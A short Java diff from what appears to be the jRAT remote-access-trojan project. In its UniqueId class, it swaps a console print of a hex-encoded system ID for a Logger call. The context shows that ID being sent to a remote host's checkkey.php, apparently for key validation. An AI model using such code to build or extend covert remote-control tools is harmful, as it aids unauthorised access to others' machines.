@@ -5,6 +5,7 @@ import java.io.FileInputStream;
 import java.net.HttpURLConnection;
 import java.util.Random;
 
+import pro.jrat.api.Logger;
 import pro.jrat.client.exceptions.InvalidKeyException;
 import pro.jrat.client.exceptions.MissingKeyException;
 import pro.jrat.client.net.WebRequest;
@@ -48,7 +49,7 @@ public final class UniqueId {
 		byte[] id = getSystemId();
 
 		if (b) {
-			System.out.println(Hex.encode(id));
+			Logger.log(Hex.encode(id));
 		}
 
 		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/misc/checkkey.php?key=" + Hex.encode(id), true);
